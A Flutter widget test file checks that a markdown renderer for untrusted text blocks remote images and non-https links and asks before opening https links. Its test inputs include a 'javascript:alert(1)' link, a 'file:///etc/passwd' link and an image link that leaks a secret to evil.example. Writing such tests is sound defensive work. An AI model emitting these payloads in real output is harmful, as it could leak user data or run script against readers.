import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:markdown_widget/markdown_widget.dart';
import 'package:opfan/shared/widgets/molecules/untrusted_markdown_configs.dart';

import '../../../testable_widget.dart';

Widget _markdown(String data) => getTestableWidget(
  Scaffold(
    body: Builder(
      builder: (context) => MarkdownBlock(
        data: data,
        config: MarkdownConfig.defaultConfig.copy(
          configs: untrustedMarkdownConfigs(context),
        ),
      ),
    ),
  ),
);

void main() {
  group('trustedExternalUri behaviour', () {
    test('accepts an absolute https link', () {
      expect(
        trustedExternalUri(' https://onepiece.fandom.com/wiki/Luffy '),
        Uri.parse('https://onepiece.fandom.com/wiki/Luffy'),
      );
    });

    test('rejects every other scheme and relative links', () {
      for (final raw in [
        'http://example.com',
        'sms:+5511999999999',
        'tel:190',
        'javascript:alert(1)',
        'file:///etc/passwd',
        '/relative/path',
        'https://',
      ]) {
        expect(trustedExternalUri(raw), isNull, reason: raw);
      }
    });
  });

  group('untrustedMarkdownConfigs behaviour', () {
    testWidgets('does not render remote images', (tester) async {
      await tester.pumpWidget(
        _markdown('Answer ![leak](https://evil.example/p.png?d=secret)'),
      );

      expect(find.byType(Image), findsNothing);
    });

    testWidgets('asks before opening an https link', (tester) async {
      await tester.pumpWidget(_markdown('[wiki](https://onepiece.fandom.com)'));

      await tester.tap(find.textContaining('wiki'));
      await tester.pumpAndSettle();

      expect(find.text('Open external link?'), findsOneWidget);
      await tester.tap(find.text('Cancel'));
      await tester.pumpAndSettle();
      expect(find.text('Open external link?'), findsNothing);
    });

    testWidgets('ignores links with other schemes', (tester) async {
      await tester.pumpWidget(_markdown('[call](tel:190)'));

      await tester.tap(find.textContaining('call'));
      await tester.pumpAndSettle();

      expect(find.byType(AlertDialog), findsNothing);
    });
  });
}
